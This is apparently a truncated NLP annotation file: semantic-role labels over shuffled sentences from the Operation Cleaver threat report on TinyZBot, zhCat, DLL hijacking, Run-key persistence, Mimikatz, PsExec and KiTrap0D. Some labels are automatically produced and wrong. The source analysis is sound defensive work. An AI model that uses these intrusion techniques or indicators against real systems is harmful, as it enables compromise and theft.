identical exports as well as an additional dummy function from the\nlegitimate msacm32.drvcalled \"StartWork\" which can be used to reliably identify similar samples": {"will": {"ARGM-ADV": {"text": "Interestingly"}, "V": {"text": "will", "index": 3}}, "load": {"ARGM-MNR": {"text": "Interestingly"}, "ARG0": {"text": "the backdoor"}, "ARGM-MOD": {"text": "will"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "load", "index": 5}, "ARG2": {"text": "the legitimate system32\\msacm32.drv file resolve functions and pass calls to it"}, "ARGM-PRP": {"text": "so it does n't break audio playback on the victim system"}}, "pass": {"ARGM-MNR": {"text": "Interestingly"}, "ARG0": {"text": "the backdoor"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "pass", "index": 13}, "ARG1": {"text": "calls"}, "ARG2": {"text": "to it"}, "ARGM-PRP": {"text": "so it does n't break audio playback on the victim system"}}, "does": {"V": {"text": "does", "index": 19}}, "break": {"ARG0": {"text": "it"}, "ARGM-NEG": {"text": "n't"}, "V": {"text": "break", "index": 21}, "ARG1": {"text": "audio playback on the victim system"}}, "contains": {"ARG0": {"text": "The backdoor"}, "V": {"text": "contains", "index": 31}, "ARG1": {"text": "identical exports as well as an additional dummy function from the legitimate msacm32.drvcalled \" StartWork \" which can be used to reliably identify similar samples"}}, "can": {"V": {"text": "can", "index": 49}}, "be": {"V": {"text": "be", "index": 50}}, "used": {"ARG1": {"text": "the legitimate msacm32.drvcalled \" StartWork \""}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 51}, "ARG2": {"text": "to reliably identify similar samples"}}, "identify": {"ARG0": {"text": "which"}, "ARGM-MNR": {"text": "reliably"}, "V": {"text": "identify", "index": 54}, "ARG1": {"text": "similar samples"}}}, " The binary is configured to communicate to \"www.microsoftservices.proxydns.com\"\non port 80 using standard HTTP POST and GET requests": {"is": {"ARG1": {"text": "The binary"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "configured to communicate to \" www.microsoftservices.proxydns.com \" on port 80 using standard HTTP POST and GET requests"}}, "configured": {"ARG1": {"text": "The binary"}, "V": {"text": "configured", "index": 3}, "ARG4": {"text": "to communicate to \" www.microsoftservices.proxydns.com \" on port 80 using standard HTTP POST and GET requests"}}, "communicate": {"V": {"text": "communicate", "index": 5}, "ARG2": {"text": "to \" www.microsoftservices.proxydns.com \" on port"}, "ARGM-ADV": {"text": "80 using standard HTTP POST"}}, "using": {"V": {"text": "using", "index": 13}, "ARG1": {"text": "standard HTTP POST"}}, "GET": {"V": {"text": "GET", "index": 18}, "ARG1": {"text": "requests"}}}, "\n\nOn reboot explorer.exe\u00a0was now happy to load the backdoor and get down to business; this technique is\nknown as dll search order hijacking or binary planting": {"reboot": {"V": {"text": "reboot", "index": 1}, "ARG1": {"text": "explorer.exe"}}, "was": {"ARGM-LOC": {"text": "On reboot"}, "ARG1": {"text": "explorer.exe"}, "V": {"text": "was", "index": 3}, "ARGM-TMP": {"text": "now"}, "ARG2": {"text": "happy to load the backdoor and get down to business"}}, "load": {"ARG0": {"text": "explorer.exe"}, "V": {"text": "load", "index": 7}, "ARG2": {"text": "the backdoor"}}, "get": {"ARG0": {"text": "explorer.exe"}, "V": {"text": "get", "index": 11}, "ARG1": {"text": "to business"}}, "is": {"V": {"text": "is", "index": 18}}, "known": {"ARG1": {"text": "this technique"}, "V": {"text": "known", "index": 19}, "ARG2": {"text": "as dll search order hijacking or binary planting"}}}, " \u00a0The decoded binary will be written to the filesystem as\n\"%APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\".\u00a0\u00a0\n\nFile Details\n\nFull File Path      %APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\u00a0\nSHA256              9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165\u00a0\nFile Size           107,008 bytes\u00a0\nCompile Time        2/4/2015 8:41:42 UTC\n\f\u00a0\n\n\n\n\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key\nin the current user's hive which will execute the next time the victim user accesses the system.\u00a0\u00a0\n\nRegistry Persistence Key     \u00a0 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\u00a0\nRegistry Key Value           \u00a0 Rundll32.exe \"%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup\n\u00a0\n\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,\nsearch, and execute files as well as list drivers on the system": {"decoded": {"V": {"text": "decoded", "index": 1}, "ARG1": {"text": "binary"}}, "will": {"V": {"text": "will", "index": 3}}, "be": {"V": {"text": "be", "index": 4}}, "written": {"ARG1": {"text": "The decoded binary"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "written", "index": 5}, "ARG2": {"text": "to the filesystem"}, "ARGM-PRP": {"text": "as \" % APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx"}}, "does": {"V": {"text": "does", "index": 35}}, "execute": {"ARG0": {"text": "The malware"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "execute", "index": 37}, "ARGM-TMP": {"text": "immediately after successful exploitation"}}, "creates": {"ARG0": {"text": "The decoded binary"}, "ARGM-ADV": {"text": "instead/ just"}, "V": {"text": "creates", "index": 45}, "ARG1": {"text": "a Run key in the current user 's hive which will execute the next time the victim user accesses the system . Registry Persistence Key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates Registry Key Value Rundll32.exe \" %"}}, "will_2": {"V": {"text": "will", "index": 56}}, "execute_2": {"ARG0": {"text": "the current user 's hive"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 57}, "ARG1": {"text": "the next time the victim user accesses the system ."}}, "accesses": {"ARG0": {"text": "the next time/ the victim user"}, "V": {"text": "accesses", "index": 64}, "ARG1": {"text": "the system"}}, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates": {"R-ARG0": {"text": "which"}, "V": {"text": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates", "index": 71}, "ARG1": {"text": "Registry Key Value Rundll32.exe \" % APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup"}}, "is": {"ARG1": {"text": "File Details Full File Path % APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx/ % APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup The ocx file"}, "V": {"text": "is", "index": 82}, "ARGM-ADV": {"text": "actually"}, "ARG2": {"text": "a DLL"}}, "provides": {"V": {"text": "provides", "index": 87}, "ARG2": {"text": "the attacker"}, "ARG1": {"text": "the ability to upload , download , enumerate , delete , search , and execute files"}}, "upload": {"V": {"text": "upload", "index": 93}}, "execute_3": {"V": {"text": "execute", "index": 104}, "ARG1": {"text": "files"}}}, " The binary is designed to be called from its one\nexported function, \"Setup\"; the Run key will ensure that whenever the victim user logs into the system the\nbackdoor will execute": {"is": {"V": {"text": "is", "index": 2}}, "designed": {"ARG1": {"text": "The binary"}, "V": {"text": "designed", "index": 3}, "ARG3": {"text": "to be called from its one exported function , \" Setup \""}}, "be": {"V": {"text": "be", "index": 5}}, "called": {"ARG1": {"text": "The binary"}, "V": {"text": "called", "index": 6}, "ARG2": {"text": "from its one exported function , \" Setup \""}}, "exported": {"V": {"text": "exported", "index": 10}, "ARG1": {"text": "function"}}, "will": {"ARG0": {"text": "the Run key"}, "V": {"text": "will", "index": 20}, "ARG1": {"text": "ensure that whenever the victim user logs into the system the backdoor will execute"}}, "ensure": {"ARG0": {"text": "the Run key"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "ensure", "index": 21}, "ARG1": {"text": "that whenever the victim user logs into the system the backdoor will execute"}}, "logs": {"ARGM-TMP": {"text": "whenever"}, "ARG0": {"text": "the victim user"}, "V": {"text": "logs", "index": 27}, "ARGM-GOL": {"text": "into the system"}}, "will_2": {"ARGM-TMP": {"text": "whenever the victim user logs into the system"}, "V": {"text": "will", "index": 33}}, "execute": {"ARGM-TMP": {"text": "whenever the victim user logs into the system"}, "ARG1": {"text": "the backdoor"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 34}}}, " A bug fix is made\n  to the keystroke logging method, and clipboard monitoring is enabled": {"is": {"V": {"text": "is", "index": 3}}, "made": {"ARG1": {"text": "A bug fix"}, "V": {"text": "made", "index": 4}, "ARG2": {"text": "to the keystroke logging method"}}, "is_2": {"V": {"text": "is", "index": 14}}, "enabled": {"ARG2": {"text": "clipboard monitoring"}, "V": {"text": "enabled", "index": 15}}}, "\n</section>\n\n\n\n<footer>35</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>PRIVILEGE ESCALATION & PIVOTING</heading>\nPrivilege escalation is a category of techniques that describe the process of going from a less\nprivileged user on a compromised computer to a more privileged user": {"is": {"ARG1": {"text": "Privilege escalation"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a category of techniques that describe the process of going from a less privileged user on a compromised computer to a more privileged user"}}, "describe": {"ARG0": {"text": "a category of techniques"}, "R-ARG0": {"text": "that"}, "V": {"text": "describe", "index": 8}, "ARG1": {"text": "the process of going from a less privileged user on a compromised computer"}, "ARG2": {"text": "to a more privileged user"}}, "going": {"V": {"text": "going", "index": 12}, "ARG3": {"text": "from a less privileged user"}, "ARG4": {"text": "on a compromised computer/ to a more privileged user"}}, "compromised": {"V": {"text": "compromised", "index": 20}, "ARG1": {"text": "computer"}}}, "\n\nSince the first version of the SOAP-based command and control protocol was implemented,\nTinyZBot used what is referred to as a \u201cdynamic password\u201d": {"based": {"ARGM-LOC": {"text": "SOAP"}, "V": {"text": "based", "index": 8}, "ARG1": {"text": "command"}}, "was": {"V": {"text": "was", "index": 13}}, "implemented": {"ARG1": {"text": "the first version of the SOAP - based command and control protocol"}, "V": {"text": "implemented", "index": 14}}, "used": {"ARGM-CAU": {"text": "Since the first version of the SOAP - based command and control protocol was implemented"}, "ARG0": {"text": "TinyZBot"}, "V": {"text": "used", "index": 17}, "ARG1": {"text": "what is referred to"}, "ARG2": {"text": "as a \u201c dynamic password \u201d"}}, "is": {"V": {"text": "is", "index": 19}}, "referred": {"ARG1": {"text": "what/ to"}, "V": {"text": "referred", "index": 20}, "ARG2": {"text": "as a \u201c dynamic password \u201d"}}}, "\ntmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></\nGetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>\n</code>\n\nIn order to download the file and parse for commands to execute, the TinyZBot must request the\nfile": {"download": {"V": {"text": "download", "index": 4}, "ARG1": {"text": "the file and parse for commands to execute"}}, "execute": {"V": {"text": "execute", "index": 12}}, "must": {"R-ARG0": {"text": "tmu In order to download the file and parse for commands to execute"}, "ARG0": {"text": "the TinyZBot"}, "V": {"text": "must", "index": 16}, "ARG1": {"text": "the"}}, "request": {"R-ARG0": {"text": "tmu In order to download the file and parse for commands to execute"}, "ARG0": {"text": "the TinyZBot"}, "ARGM-MOD": {"text": "must"}, "V": {"text": "request", "index": 17}, "ARG1": {"text": "the file"}}}, " Double encoding\nSQL injection payloads allows for bypassing of various anti-exploitation filters, such as those\nsupplied by Web Application Firewalls (WAFs)": {"encoding": {"ARGM-MNR": {"text": "Double"}, "V": {"text": "encoding", "index": 1}, "ARG1": {"text": "SQL injection payloads"}}, "allows": {"ARG0": {"text": "Double encoding SQL injection payloads"}, "V": {"text": "allows", "index": 5}, "ARG1": {"text": "for bypassing of various anti - exploitation filters , such as those supplied by Web Application Firewalls ( WAFs )"}}, "supplied": {"ARG1": {"text": "those"}, "V": {"text": "supplied", "index": 18}, "ARG0": {"text": "by Web Application Firewalls ( WAFs )"}}}, " The sending is\nperformed by internally developed malware samples such as TinyZBot and Csext in order to\nexfiltrate information about the infected computer, as well as requested files and keystroke\nlogging information": {"is": {"V": {"text": "is", "index": 2}}, "performed": {"ARG1": {"text": "The sending"}, "V": {"text": "performed", "index": 3}, "ARG0": {"text": "by internally developed malware samples such as TinyZBot and Csext"}, "ARGM-PRP": {"text": "in order to exfiltrate information about the infected computer , as well as requested files and keystroke logging information"}}, "developed": {"ARGM-MNR": {"text": "internally"}, "V": {"text": "developed", "index": 6}, "ARG1": {"text": "malware"}, "ARGM-PRP": {"text": "in order to exfiltrate information about the infected computer , as well as requested files and keystroke logging information"}}, "exfiltrate": {"V": {"text": "exfiltrate", "index": 17}, "ARG1": {"text": "information about the infected computer"}}, "requested": {"V": {"text": "requested", "index": 27}, "ARG1": {"text": "files"}}, "keystroke": {"V": {"text": "keystroke", "index": 30}, "ARG1": {"text": "logging information"}}, "logging": {"ARG0": {"text": "keystroke"}, "V": {"text": "logging", "index": 31}, "ARG1": {"text": "information"}}}, "\n\n</section>\n\n\n<footer>41</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure> \n\n</header>\n<section>\n<heading>Anonymous FTP Servers</heading>\nCleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access\nenabled in order to pilfer large quantities of information": {"observed": {"ARG0": {"text": "Cleaver Operations"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "in 2013/ mainly utilized FTP servers"}, "ARGM-PRD": {"text": "with anonymous access enabled in order to pilfer large quantities of information"}}, "utilized": {"ARGM-ADV": {"text": "mainly"}, "V": {"text": "utilized", "index": 6}, "ARG1": {"text": "FTP servers"}}, "enabled": {"V": {"text": "enabled", "index": 12}, "ARGM-PRP": {"text": "in order to pilfer large quantities of information"}}, "pilfer": {"V": {"text": "pilfer", "index": 16}, "ARG1": {"text": "large quantities of information"}}}, " These are scripts or applications that allowed\n  for command or code execution outside of the victim network": {"are": {"ARG1": {"text": "These"}, "V": {"text": "are", "index": 1}, "ARG2": {"text": "scripts or applications that allowed for command or code execution outside of the victim network"}}, "allowed": {"ARG0": {"text": "scripts or applications"}, "R-ARG0": {"text": "that"}, "V": {"text": "allowed", "index": 6}, "ARG1": {"text": "for command or code execution"}, "ARGM-LOC": {"text": "outside of the victim network"}}}, "\n\nFor the command and control examples below, red text represents TCP data sent from the\nTinyZBot infection while blue text represents TCP data sent from the command and control\nserver": {"represents": {"ARGM-ADV": {"text": "For the command and control examples below"}, "ARG0": {"text": "red text"}, "V": {"text": "represents", "index": 10}, "ARG1": {"text": "TCP data sent from the TinyZBot infection while blue text represents TCP data sent from the command and control server"}}, "sent": {"ARG1": {"text": "TCP data"}, "V": {"text": "sent", "index": 13}, "ARG2": {"text": "from the TinyZBot infection"}}, "represents_2": {"ARG0": {"text": "blue text"}, "V": {"text": "represents", "index": 21}, "ARG1": {"text": "TCP data sent from the command and control server"}}, "sent_2": {"ARG1": {"text": "TCP data"}, "V": {"text": "sent", "index": 24}, "ARG2": {"text": "from the command and control server"}}}, " This zhCat\n  instance is running cmd.exe, effectively making it a reverse connecting shell": {"is": {"V": {"text": "is", "index": 3}}, "running": {"ARG0": {"text": "This zhCat instance"}, "V": {"text": "running", "index": 4}, "ARG1": {"text": "cmd.exe"}, "ARGM-ADV": {"text": "effectively making it a reverse connecting shell"}}, "making": {"ARG0": {"text": "This zhCat instance"}, "ARGM-MNR": {"text": "effectively"}, "V": {"text": "making", "index": 8}, "ARG1": {"text": "it a reverse connecting shell"}}, "connecting": {"ARGM-MNR": {"text": "reverse"}, "V": {"text": "connecting", "index": 12}, "ARG1": {"text": "shell"}}}, " A command and control protocol was established, using HTTP and SOAP for the\n protocol": {"was": {"V": {"text": "was", "index": 5}}, "established": {"ARG1": {"text": "A command and control protocol"}, "V": {"text": "established", "index": 6}, "ARGM-PRD": {"text": "using HTTP and SOAP for the protocol"}}, "using": {"V": {"text": "using", "index": 8}, "ARG1": {"text": "HTTP and SOAP"}, "ARG2": {"text": "for the protocol"}}}, "\n\n</section>\n<footer>44</footer>\n\f\n<header>#OPCLEAVER</header>\n<section>\n\n <heading>zhCat (cont.)</heading>\n\n<figure></figure>\n\n Upon inspecting the network traffic again, we see the following HTTP POST request": {"inspecting": {"V": {"text": "inspecting", "index": 1}, "ARG1": {"text": "the network traffic"}, "ARGM-TMP": {"text": "again"}}, "see": {"ARGM-TMP": {"text": "Upon inspecting the network traffic again"}, "ARG0": {"text": "we"}, "V": {"text": "see", "index": 8}, "ARG1": {"text": "the following HTTP POST request"}}}, " We originally located it on a staging server being utilized for multiple attacks as well as\na tool for sharing data between members of the organization\u2019s team": {"located": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "originally"}, "V": {"text": "located", "index": 2}, "ARG1": {"text": "it"}, "ARGM-LOC": {"text": "on a staging server being utilized for"}, "ARGM-PRP": {"text": "multiple attacks as well as a tool for sharing data between members of the organization \u2019s team"}}, "being": {"V": {"text": "being", "index": 8}}, "utilized": {"ARG1": {"text": "a staging server"}, "V": {"text": "utilized", "index": 9}, "ARGM-PRP": {"text": "for multiple attacks as well as a tool for sharing"}}, "sharing": {"V": {"text": "sharing", "index": 19}, "ARG1": {"text": "data"}, "ARG2": {"text": "between members of the organization \u2019s team"}}}, " The commands as well as infected computer information are transferred in the Content-\n  Disposition HTTP header, making the traffic easy to pass over as benign": {"infected": {"V": {"text": "infected", "index": 5}, "ARG1": {"text": "computer information"}}, "are": {"V": {"text": "are", "index": 8}}, "transferred": {"ARG1": {"text": "The commands as well as infected computer information"}, "V": {"text": "transferred", "index": 9}, "ARGM-LOC": {"text": "in the Content- Disposition HTTP header"}, "ARGM-ADV": {"text": "making the traffic easy to pass over as benign"}}, "making": {"ARG0": {"text": "The commands as well as infected computer information"}, "V": {"text": "making", "index": 17}, "ARG1": {"text": "the traffic easy to pass over as benign"}}, "pass": {"ARG1": {"text": "the traffic"}, "V": {"text": "pass", "index": 22}, "ARGM-DIR": {"text": "over"}, "ARGM-ADV": {"text": "as benign"}}}, " This allowed supplemental tools to keep TinyZBot running by enumerating\n every process and checking if the process ID and mutex prefix existed": {"allowed": {"ARG0": {"text": "This"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "supplemental tools to keep TinyZBot running by enumerating every process and checking if the process ID and mutex prefix existed"}}, "keep": {"ARG0": {"text": "supplemental tools"}, "V": {"text": "keep", "index": 5}, "ARG1": {"text": "TinyZBot running"}, "ARG2": {"text": "by enumerating every process"}}, "running": {"ARG1": {"text": "TinyZBot"}, "V": {"text": "running", "index": 7}, "ARGM-MNR": {"text": "by enumerating every process"}}, "enumerating": {"ARG0": {"text": "supplemental tools"}, "V": {"text": "enumerating", "index": 9}, "ARG1": {"text": "every process"}}, "checking": {"ARG0": {"text": "supplemental tools"}, "V": {"text": "checking", "index": 13}, "ARG1": {"text": "if the process ID and mutex prefix existed"}}, "existed": {"ARG1": {"text": "the process ID and mutex prefix"}, "V": {"text": "existed", "index": 21}}}, " PrivEsc is a compiled exploit, which leverages\nthe vulnerability commonly referred to as KiTrap0D (CVE-2010-0232)": {"is": {"ARG1": {"text": "PrivEsc"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a compiled exploit , which leverages the vulnerability commonly referred to as KiTrap0D ( CVE-2010 - 0232 )"}}, "compiled": {"V": {"text": "compiled", "index": 3}, "ARG1": {"text": "exploit"}}, "leverages": {"ARG0": {"text": "a compiled exploit"}, "R-ARG0": {"text": "which"}, "V": {"text": "leverages", "index": 7}, "ARG1": {"text": "the vulnerability commonly referred to as KiTrap0D ( CVE-2010"}}, "referred": {"ARG0": {"text": "the vulnerability"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "referred", "index": 11}, "ARG2": {"text": "as KiTrap0D ( CVE-2010 - 0232 )"}}}, " 73\n</toc>\n\n\n\n<footer>4</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>EXECUTIVE SUMMARY</heading>\n  Since at least 2012, Iranian actors have directly attacked,\n  established persistence in, and extracted highly sensitive\n  materials from the networks of government agencies and major\n  critical infrastructure companies in the following countries:\n  Canada, China, England, France, Germany, India, Israel,\n  Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea,\n  Turkey, United Arab Emirates, and the United States": {"have": {"V": {"text": "have", "index": 8}}, "attacked": {"ARGM-TMP": {"text": "73 Since at least 2012"}, "ARG0": {"text": "Iranian actors"}, "ARGM-MNR": {"text": "directly"}, "V": {"text": "attacked", "index": 10}, "ARGM-ADV": {"text": "established persistence in"}}, "established": {"ARG0": {"text": "Iranian actors"}, "V": {"text": "established", "index": 12}, "ARG1": {"text": "persistence"}, "ARGM-LOC": {"text": "in"}}, "extracted": {"ARGM-TMP": {"text": "73 Since at least 2012"}, "ARG0": {"text": "Iranian actors"}, "V": {"text": "extracted", "index": 17}, "ARG1": {"text": "highly sensitive materials"}, "ARG2": {"text": "from the networks of government agencies and major critical infrastructure companies in the following countries : Canada , China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea , Turkey , United Arab Emirates , and the United States"}}, "following": {"V": {"text": "following", "index": 34}, "ARG1": {"text": "countries"}}}, " This can make it useful for tools like the PVZ tool chain and Csext to execute\nwith logged results:\n\n\n<figure></figure>\n\n                          <caption>Figure 22: The MimikatzWrapper dumps credentials out to a file.</caption>\n</section>\n\n\n<footer>38</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PsExec Spreading</heading>\n  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext\n  form, PsExec can be used to run commands on any other computer which accepts those domain\n  credentials": {"can": {"V": {"text": "can", "index": 1}}, "make": {"ARG0": {"text": "This"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "make", "index": 2}, "ARG1": {"text": "it useful for tools like the PVZ tool chain and Csext to execute with logged results"}}, "execute": {"ARG0": {"text": "tools like the PVZ tool chain and Csext"}, "V": {"text": "execute", "index": 15}, "ARGM-MNR": {"text": "with logged results"}}, "logged": {"V": {"text": "logged", "index": 17}, "ARG1": {"text": "results"}}, "has": {"ARG0": {"text": "an attacker"}, "V": {"text": "has", "index": 23}, "ARG1": {"text": "credentials extracted from the cache"}}, "extracted": {"V": {"text": "extracted", "index": 25}, "ARG2": {"text": "from the cache"}}, "can_2": {"V": {"text": "can", "index": 40}}, "be": {"V": {"text": "be", "index": 41}}, "used": {"ARGM-MNR": {"text": "in hash form or in plaintext form"}, "ARG1": {"text": "PsExec"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 42}, "ARG2": {"text": "to run commands on any other computer which accepts those domain credentials"}}, "run": {"ARG0": {"text": "PsExec"}, "V": {"text": "run", "index": 44}, "ARG1": {"text": "commands on any other computer which accepts those domain credentials"}}, "accepts": {"ARG0": {"text": "any other computer"}, "R-ARG0": {"text": "which"}, "V": {"text": "accepts", "index": 51}, "ARG1": {"text": "those domain credentials"}}}, " This keystroke logger source is publicly\n  available and referred to as DeadkeyLogger": {"is": {"ARG1": {"text": "This keystroke logger source"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "publicly available"}}, "referred": {"V": {"text": "referred", "index": 8}, "ARG1": {"text": "to"}, "ARG2": {"text": "as DeadkeyLogger"}}}, " This\n  copy repeats the behavior of the original, but with already discovered credentials as well as\n  newly discovered ones on the newly infected host": {"repeats": {"ARG0": {"text": "This copy"}, "V": {"text": "repeats", "index": 2}, "ARG1": {"text": "the behavior of the original"}}, "discovered": {"ARGM-TMP": {"text": "already"}, "V": {"text": "discovered", "index": 12}, "ARG1": {"text": "credentials"}}, "discovered_2": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "discovered", "index": 18}, "ARG1": {"text": "ones"}}, "infected": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "infected", "index": 23}, "ARG1": {"text": "host"}}}, " Many versions were obfuscated with a legitimate tool for developers named\nSmartAssembly, which makes the recovery of some names implausible": {"were": {"ARG1": {"text": "Many versions"}, "V": {"text": "were", "index": 2}, "ARG2": {"text": "obfuscated with a legitimate tool for developers named SmartAssembly , which makes the recovery of some names implausible"}}, "obfuscated": {"ARG1": {"text": "Many versions"}, "V": {"text": "obfuscated", "index": 3}, "ARG2": {"text": "with a legitimate tool for developers named SmartAssembly , which makes the recovery of some names implausible"}}, "named": {"ARG1": {"text": "developers"}, "V": {"text": "named", "index": 10}, "ARG2": {"text": "SmartAssembly"}}, "makes": {"ARG0": {"text": "a legitimate tool for developers named SmartAssembly"}, "R-ARG0": {"text": "which"}, "V": {"text": "makes", "index": 14}, "ARG1": {"text": "the recovery of some names implausible"}}}, " HTTP communications are often used by botnets, but it is uncommon\nto use a sub-protocol such as SOAP": {"are": {"V": {"text": "are", "index": 2}}, "used": {"ARG1": {"text": "HTTP communications"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "used", "index": 4}, "ARG0": {"text": "by botnets"}}, "is": {"V": {"text": "is", "index": 10}, "ARG2": {"text": "uncommon"}, "ARG1": {"text": "to use a sub - protocol such as SOAP"}}, "use": {"V": {"text": "use", "index": 13}, "ARG1": {"text": "a sub - protocol such as SOAP"}}}, " When early versions of TinyZBot were executed, they opened an image stored\n  in the resource section of the executable and copied the malicious TinyZBot executable to the\n  %AppData% directory": {"were": {"V": {"text": "were", "index": 5}}, "executed": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "early versions of TinyZBot"}, "V": {"text": "executed", "index": 6}}, "opened": {"ARGM-TMP": {"text": "When early versions of TinyZBot were executed"}, "ARG0": {"text": "they"}, "V": {"text": "opened", "index": 9}, "ARG1": {"text": "an image stored in the resource section of the executable"}}, "stored": {"ARG1": {"text": "an image"}, "V": {"text": "stored", "index": 12}, "ARGM-LOC": {"text": "in the resource section of the executable"}}, "copied": {"ARGM-TMP": {"text": "When early versions of TinyZBot were executed"}, "ARG0": {"text": "they"}, "V": {"text": "copied", "index": 21}, "ARG1": {"text": "the malicious TinyZBot executable"}, "ARGM-EXT": {"text": "to the % AppData% directory"}}}, " Command functionality is limited to executing supplied commands,\n  downloading and executing executables as well as self-updating": {"is": {"ARG1": {"text": "Command functionality"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "limited to executing supplied commands , downloading and executing executables as well as self - updating"}}, "limited": {"ARG1": {"text": "Command functionality"}, "V": {"text": "limited", "index": 3}, "ARG2": {"text": "to executing supplied commands , downloading and executing executables as well as self - updating"}}, "executing": {"ARG0": {"text": "Command functionality"}, "V": {"text": "executing", "index": 5}, "ARG1": {"text": "supplied commands"}}, "supplied": {"V": {"text": "supplied", "index": 6}, "ARG1": {"text": "commands"}}, "downloading": {"ARG0": {"text": "Command functionality"}, "V": {"text": "downloading", "index": 9}, "ARG1": {"text": "executables as well as self - updating"}}, "executing_2": {"ARG0": {"text": "Command functionality"}, "V": {"text": "executing", "index": 11}, "ARG1": {"text": "executables as well as self - updating"}}, "updating": {"ARG1": {"text": "self"}, "V": {"text": "updating", "index": 18}}}, " It also has a remotely installable trojan named Abel, which\n  enables some of its functionality on a remote target": {"has": {"ARG0": {"text": "It"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "a remotely installable trojan named Abel , which enables some of its functionality on a remote target"}}, "named": {"ARG1": {"text": "a remotely installable trojan"}, "V": {"text": "named", "index": 7}, "ARG2": {"text": "Abel"}}, "enables": {"ARG0": {"text": "a remotely installable trojan named Abel"}, "R-ARG0": {"text": "which"}, "V": {"text": "enables", "index": 11}, "ARG1": {"text": "some of its functionality on a remote target"}}}, "\n  </section>\n\n  <section>\n  <heading>Deception</heading>\n   \n  TinyZBot is commonly installed using some form of deception": {"is": {"V": {"text": "is", "index": 1}}, "installed": {"ARG1": {"text": "TinyZBot"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "installed", "index": 3}, "ARG2": {"text": "using some form of deception"}}, "using": {"V": {"text": "using", "index": 4}, "ARG1": {"text": "some form of deception"}}}, " Its functionality breaks down into three fairly standard components: SQL queries,\n  executing commands, and uploading files": {"breaks": {"ARG1": {"text": "Its functionality"}, "V": {"text": "breaks", "index": 2}, "ARGM-PRD": {"text": "into three fairly standard components : SQL queries , executing commands , and uploading files"}}, "executing": {"V": {"text": "executing", "index": 13}, "ARG1": {"text": "commands"}}, "uploading": {"V": {"text": "uploading", "index": 17}, "ARG1": {"text": "files"}}}, " This indicates that TinyZBot is not only being installed while impersonating a r\u00e9sum\u00e9\n creation suite, but is also impersonating potential employers when distributed": {"indicates": {"ARG0": {"text": "This"}, "V": {"text": "indicates", "index": 1}, "ARG1": {"text": "that TinyZBot is not only being installed while impersonating a r\u00e9sum\u00e9 creation suite , but is also impersonating potential employers when distributed"}}, "is": {"V": {"text": "is", "index": 4}}, "being": {"V": {"text": "being", "index": 7}}, "installed": {"ARG1": {"text": "TinyZBot"}, "V": {"text": "installed", "index": 8}, "ARGM-TMP": {"text": "while impersonating a r\u00e9sum\u00e9 creation suite"}}, "impersonating": {"ARG0": {"text": "TinyZBot"}, "V": {"text": "impersonating", "index": 10}, "ARG1": {"text": "a r\u00e9sum\u00e9 creation suite"}}, "is_2": {"ARG1": {"text": "TinyZBot"}, "V": {"text": "is", "index": 17}, "ARGM-DIS": {"text": "also"}, "ARG2": {"text": "impersonating potential employers"}, "ARGM-TMP": {"text": "when distributed"}}, "impersonating_2": {"ARG0": {"text": "TinyZBot"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "impersonating", "index": 19}, "ARG1": {"text": "potential employers"}, "ARGM-TMP": {"text": "when distributed"}}, "distributed": {"ARGM-TMP": {"text": "when"}, "V": {"text": "distributed", "index": 